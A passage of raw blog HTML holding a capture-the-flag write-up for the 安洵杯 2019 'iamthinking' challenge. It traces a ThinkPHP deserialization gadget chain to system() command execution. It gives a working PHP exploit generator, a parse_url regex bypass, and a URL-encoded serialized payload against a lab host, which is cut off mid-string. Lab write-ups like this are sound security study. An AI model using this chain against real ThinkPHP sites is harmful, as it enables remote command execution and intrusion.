class="hljs-variable">$val</span>) &#123;   <span class="hljs-comment">//数据输出显示的属性</span><br>            <span class="hljs-keyword">if</span> (is_string(<span class="hljs-variable">$val</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$val</span>, <span class="hljs-string">&#x27;.&#x27;</span>)) &#123;<br>                    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$relation</span>, <span class="hljs-variable">$name</span>)      = explode(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$val</span>);<br>                    <span class="hljs-keyword">$this</span>-&gt;visible[<span class="hljs-variable">$relation</span>][] = <span class="hljs-variable">$name</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">$this</span>-&gt;visible[<span class="hljs-variable">$val</span>] = <span class="hljs-literal">true</span>;<br>                    <span class="hljs-variable">$hasVisible</span>          = <span class="hljs-literal">true</span>;<br>                &#125;<br>                <span class="hljs-keyword">unset</span>(<span class="hljs-keyword">$this</span>-&gt;visible[<span class="hljs-variable">$key</span>]); <span class="hljs-comment">//置空visible所有元素</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;hidden <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$val</span>) &#123;  <span class="hljs-comment">//数据输出隐藏的属性</span><br>            <span class="hljs-keyword">if</span> (is_string(<span class="hljs-variable">$val</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$val</span>, <span class="hljs-string">&#x27;.&#x27;</span>)) &#123;<br>                    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$relation</span>, <span class="hljs-variable">$name</span>)     = explode(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$val</span>);<br>                    <span class="hljs-keyword">$this</span>-&gt;hidden[<span class="hljs-variable">$relation</span>][] = <span class="hljs-variable">$name</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">$this</span>-&gt;hidden[<span class="hljs-variable">$val</span>] = <span class="hljs-literal">true</span>;<br>                &#125;<br>                <span class="hljs-keyword">unset</span>(<span class="hljs-keyword">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>]);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 合并关联数据</span><br>        <span class="hljs-variable">$data</span> = array_merge(<span class="hljs-keyword">$this</span>-&gt;data, <span class="hljs-keyword">$this</span>-&gt;relation); <span class="hljs-comment">//array_merge() 将一个或多个数组的单元合并起来，一个数组中的值附加在前一个数组的后面。返回作为结果的数组。</span><br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$val</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$val</span> <span class="hljs-keyword">instanceof</span> Model || <span class="hljs-variable">$val</span> <span class="hljs-keyword">instanceof</span> ModelCollection) &#123;<br>                <span class="hljs-comment">// 关联模型对象</span><br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;visible[<span class="hljs-variable">$key</span>]) &amp;&amp; is_array(<span class="hljs-keyword">$this</span>-&gt;visible[<span class="hljs-variable">$key</span>])) &#123;<br>                    <span class="hljs-variable">$val</span>-&gt;visible(<span class="hljs-keyword">$this</span>-&gt;visible[<span class="hljs-variable">$key</span>]);<br>                &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>]) &amp;&amp; is_array(<span class="hljs-keyword">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>])) &#123;<br>                    <span class="hljs-variable">$val</span>-&gt;hidden(<span class="hljs-keyword">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>]);<br>                &#125;<br>                <span class="hljs-comment">// 关联模型对象</span><br>                <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>]) || <span class="hljs-literal">true</span> !== <span class="hljs-keyword">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>]) &#123;<br>                    <span class="hljs-variable">$item</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$val</span>-&gt;toArray();<br>                &#125;<br>            &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;visible[<span class="hljs-variable">$key</span>])) &#123;<br>                <span class="hljs-variable">$item</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-keyword">$this</span>-&gt;getAttr(<span class="hljs-variable">$key</span>);<br>            &#125; <span class="hljs-keyword">elseif</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>]) &amp;&amp; !<span class="hljs-variable">$hasVisible</span>) &#123;<br>                <span class="hljs-variable">$item</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-keyword">$this</span>-&gt;getAttr(<span class="hljs-variable">$key</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 追加属性（必须定义获取器）</span><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;append <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$name</span>) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;appendAttrToArray(<span class="hljs-variable">$item</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$name</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$item</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>​    因为我们探讨的是 toArray() 的返回值，所以需要关注 $item的值从何何来 不难看到 line47,line49都是用了getAttr()这个函数，跟进这个函数</p><p>于是在 <code>安洵杯 2019]iamthinking\www\tp\vendor\topthink\think-orm\src\model\concern\Attribute.php</code> 发现了函数定义 传入参数 为 $key</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 获取器 获取数据对象的值</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@access</span> public</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  string $name 名称</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> mixed</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> InvalidArgumentException</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getAttr</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;  <span class="hljs-comment">//异常处理 一般情况使用</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-variable">$relation</span> = <span class="hljs-literal">false</span>;<br>            <span class="hljs-variable">$value</span>    = <span class="hljs-keyword">$this</span>-&gt;getData(<span class="hljs-variable">$name</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">InvalidArgumentException</span> <span class="hljs-variable">$e</span>) &#123;<br>            <span class="hljs-variable">$relation</span> = <span class="hljs-keyword">$this</span>-&gt;isRelationAttr(<span class="hljs-variable">$name</span>);<br>            <span class="hljs-variable">$value</span>    = <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;getValue(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$relation</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>​    这里正常的思路自然是  走 常规的支路 随后直接返回getValue的值，于是我继续跟进了getValue函数，这里也可能是出题人的小心思，一下让我看到了解题的希望，一眼看到了 system(ls,)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getValue</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$relation</span> = <span class="hljs-literal">false</span></span>)</span><br><span class="hljs-function">   </span>&#123;<br>       <span class="hljs-comment">// 检测属性获取器</span><br>       <span class="hljs-variable">$fieldName</span> = <span class="hljs-keyword">$this</span>-&gt;getRealFieldName(<span class="hljs-variable">$name</span>);<br>       <span class="hljs-variable">$method</span>    = <span class="hljs-string">&#x27;get&#x27;</span> . Str::studly(<span class="hljs-variable">$name</span>) . <span class="hljs-string">&#x27;Attr&#x27;</span>;<br><br>       <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;withAttr[<span class="hljs-variable">$fieldName</span>])) &#123;<br>           <span class="hljs-keyword">if</span> (<span class="hljs-variable">$relation</span>) &#123;<br>               <span class="hljs-variable">$value</span> = <span class="hljs-keyword">$this</span>-&gt;getRelationValue(<span class="hljs-variable">$relation</span>);<br>           &#125;<br><br>           <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$fieldName</span>, <span class="hljs-keyword">$this</span>-&gt;json) &amp;&amp; is_array(<span class="hljs-keyword">$this</span>-&gt;withAttr[<span class="hljs-variable">$fieldName</span>])) &#123;<br>               <span class="hljs-variable">$value</span> = <span class="hljs-keyword">$this</span>-&gt;getJsonValue(<span class="hljs-variable">$fieldName</span>, <span class="hljs-variable">$value</span>);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-comment">//$fieldName = a</span><br>               <span class="hljs-comment">//withAttr[a] = system</span><br>               <span class="hljs-variable">$closure</span> = <span class="hljs-keyword">$this</span>-&gt;withAttr[<span class="hljs-variable">$fieldName</span>];<br>               <span class="hljs-comment">//value = system(ls,)</span><br>               <span class="hljs-variable">$value</span>   = <span class="hljs-variable">$closure</span>(<span class="hljs-variable">$value</span>, <span class="hljs-keyword">$this</span>-&gt;data);<br>           &#125;<br>       &#125; <span class="hljs-keyword">elseif</span> (method_exists(<span class="hljs-keyword">$this</span>, <span class="hljs-variable">$method</span>)) &#123;<br>           <span class="hljs-keyword">if</span> (<span class="hljs-variable">$relation</span>) &#123;<br>               <span class="hljs-variable">$value</span> = <span class="hljs-keyword">$this</span>-&gt;getRelationValue(<span class="hljs-variable">$relation</span>);<br>           &#125;<br><br>           <span class="hljs-variable">$value</span> = <span class="hljs-keyword">$this</span>-&gt;<span class="hljs-variable">$method</span>(<span class="hljs-variable">$value</span>, <span class="hljs-keyword">$this</span>-&gt;data);<br>       &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;type[<span class="hljs-variable">$fieldName</span>])) &#123;<br>           <span class="hljs-comment">// 类型转换</span><br>           <span class="hljs-variable">$value</span> = <span class="hljs-keyword">$this</span>-&gt;readTransform(<span class="hljs-variable">$value</span>, <span class="hljs-keyword">$this</span>-&gt;type[<span class="hljs-variable">$fieldName</span>]);<br>       &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-keyword">$this</span>-&gt;autoWriteTimestamp &amp;&amp; in_array(<span class="hljs-variable">$fieldName</span>, [<span class="hljs-keyword">$this</span>-&gt;createTime, <span class="hljs-keyword">$this</span>-&gt;updateTime])) &#123;<br>           <span class="hljs-variable">$value</span> = <span class="hljs-keyword">$this</span>-&gt;getTimestampValue(<span class="hljs-variable">$value</span>);<br>       &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$relation</span>) &#123;<br>           <span class="hljs-variable">$value</span> = <span class="hljs-keyword">$this</span>-&gt;getRelationValue(<span class="hljs-variable">$relation</span>);<br>           <span class="hljs-comment">// 保存关联对象值</span><br>           <span class="hljs-keyword">$this</span>-&gt;relation[<span class="hljs-variable">$name</span>] = <span class="hljs-variable">$value</span>;<br>       &#125;<br><br>       <span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>   &#125;<br><br></code></pre></td></tr></table></figure><p>​    直接关注利用点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$fieldName</span>, <span class="hljs-keyword">$this</span>-&gt;json) &amp;&amp; is_array(<span class="hljs-keyword">$this</span>-&gt;withAttr[<span class="hljs-variable">$fieldName</span>])) &#123;<br>                <span class="hljs-variable">$value</span> = <span class="hljs-keyword">$this</span>-&gt;getJsonValue(<span class="hljs-variable">$fieldName</span>, <span class="hljs-variable">$value</span>);<br> &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">//$fieldName = a</span><br>                <span class="hljs-comment">//withAttr[a] = system</span><br>                <span class="hljs-variable">$closure</span> = <span class="hljs-keyword">$this</span>-&gt;withAttr[<span class="hljs-variable">$fieldName</span>];<br>                <span class="hljs-comment">//value = system(ls,)</span><br>                <span class="hljs-variable">$value</span>   = <span class="hljs-variable">$closure</span>(<span class="hljs-variable">$value</span>, <span class="hljs-keyword">$this</span>-&gt;data);<br>     <span class="hljs-keyword">$this</span>-&gt;a-&gt;<br>&#125;<br></code></pre></td></tr></table></figure><p>​    这个很命令执行了，为了执行到else后面的语句块，前面if的条件一定不能满足。然后关注 $clousure,$value两个变量的值 因为system函数允许传入两个参数 system(ls,)是可行的</p><ul><li>$clousure</li></ul><p>来源于withAttr[$fieldName];   <code>$fieldName = $this-&gt;getRealFieldName($name);</code> </p><p>跟进一下 getRealFieldName 注意这里$name 实际上是前面传入的 $key</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getRealFieldName</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>): <span class="hljs-title">string</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;strict ? <span class="hljs-variable">$name</span> : Str::snake(<span class="hljs-variable">$name</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>只要 $this-&gt;strict 为 True 就直接返回原结果，然而strict默认是true <code>protected $strict = true;</code></p><ul><li>$value</li></ul><p>按照现有思路 $value的值在getValue函数中没有体现，在getAttr里出现了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getAttr</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    ...</span><br><span class="hljs-function">$<span class="hljs-title">value</span>    = $<span class="hljs-title">this</span>-&gt;<span class="hljs-title">getData</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getData</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span> = <span class="hljs-literal">null</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>...<br><span class="hljs-variable">$fieldName</span> = <span class="hljs-keyword">$this</span>-&gt;getRealFieldName(<span class="hljs-variable">$name</span>);<br><span class="hljs-keyword">if</span> (array_key_exists(<span class="hljs-variable">$fieldName</span>, <span class="hljs-keyword">$this</span>-&gt;data)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;data[<span class="hljs-variable">$fieldName</span>];&#125;<br>    <span class="hljs-keyword">elseif</span> (array_key_exists(<span class="hljs-variable">$name</span>, <span class="hljs-keyword">$this</span>-&gt;relation)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;relation[<span class="hljs-variable">$name</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>​    可以发现有由用到了这个 getRealFieldName 函数和上面一样</p><p>​    那这个$clousure,$value已经完全可控了 满足后面的条件即可 <code> if (in_array($fieldName, $this-&gt;json) &amp;&amp; is_array($this-&gt;withAttr[$fieldName])</code></p><p>​    看第二个条件判断 这里是判断的withAttr的其中一个值是否为数组 也就是说 只要 withAttr是一维数组就可以使返回结果为 False 进而进入到else分支执行命令</p><p>由此有简易exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">concern</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">model</span>\<span class="hljs-title">concern</span>\<span class="hljs-title">Attribute</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">trait</span> <span class="hljs-title">Attribute</span></span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;withAttr = [<span class="hljs-string">&quot;key&quot;</span> =&gt; <span class="hljs-string">&quot;system&quot;</span>];<br><span class="hljs-keyword">$this</span>-&gt;data = [<span class="hljs-string">&quot;key&quot;</span> =&gt; <span class="hljs-string">&quot;ls&quot;</span>]; <br>    &#125;<br></code></pre></td></tr></table></figure><p>此外还需要将前面说的<code>table</code>声明为Pivot类对象，因为Model 是抽象类不能实例化，这里选择它的继承类来实例化，从而将两个POP链串联起来，</p><p>资料来源：<a href="https://www.kancloud.cn/manual/thinkphp5_1/354060">Thinkphp开发手册 中间表模型类必须继承<code>think\model\Pivot</code></a></p><h2 id="构建你的exp"><a href="#构建你的exp" class="headerlink" title="构建你的exp"></a>构建你的exp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>;<br><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span></span>&#123;<br>    <span class="hljs-keyword">use</span> <span class="hljs-title">model</span>\<span class="hljs-title">concern</span>\<span class="hljs-title">Attribute</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$lazySave</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$withEvent</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$exists</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$table</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;lazySave = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;withEvent = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;exists = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;table = <span class="hljs-variable">$obj</span>;<br>    &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">concern</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">trait</span> <span class="hljs-title">Attribute</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$data</span>=[<span class="hljs-string">&quot;key&quot;</span> =&gt; <span class="hljs-string">&quot;cat /flag&quot;</span>];<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$withAttr</span>=[<span class="hljs-string">&quot;key&quot;</span> =&gt; <span class="hljs-string">&quot;system&quot;</span>];<br>    &#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>;<br><br>    <span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span><br><span class="hljs-class">    </span>&#123;<br>    &#125;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Pivot();<br>    <span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> Pivot(<span class="hljs-variable">$a</span>);<br><br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$b</span>));<br></code></pre></td></tr></table></figure><h2 id="彩，彩蛋？"><a href="#彩，彩蛋？" class="headerlink" title="彩，彩蛋？"></a>彩，彩蛋？</h2><p>都写这么多了把这题wp补充一下吧</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202260124476.png" alt="image-20220226012427395"></p><p>上面构造完exp 然后看首页这里有反序列化入口，不过上面有个正则。我们改怎么Bypass？这里可以用 parse_url缺陷来绕过</p><p>eg:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">parse<span class="hljs-constructor">_url(&#x27;<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">a</span>.<span class="hljs-params">php</span>?<span class="hljs-params">id</span>=1&#x27;)</span><br><span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>这样payload不会被检查</p><p>最后的payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">37</span>dda<span class="hljs-number">676</span>-f<span class="hljs-number">281</span>-<span class="hljs-number">413</span>f-<span class="hljs-number">973</span>a-d<span class="hljs-number">17392</span>b<span class="hljs-number">20</span>e<span class="hljs-number">14</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>///public/index.php?payload=O%<span class="hljs-number">3</span>A<span class="hljs-number">17</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Cmodel%<span class="hljs-number">5</span>CPivot%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">21</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>CModel%<span class="hljs-number">00</span>lazySave%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">12</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>withEvent%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">19</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>CModel%<span class="hljs-number">00</span>exists%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">8</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>table%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">17</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Cmodel%<span class="hljs-number">5</span>CPivot%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">21</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>CModel%<span class="hljs-number">00</span>lazySave%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">12</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>withEvent%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">19</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>CModel%<span class="hljs-number">00</span>exists%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">8</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>table%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">17</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>CModel%<span class="hljs-number">00</span>data%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>key%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">9</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>cat+%<span class="hljs-number">2</span>Fflag%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">21</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>CModel%<span class="hljs-number">00</span>withAttr%<span class="hljs-number">22</span>%<span 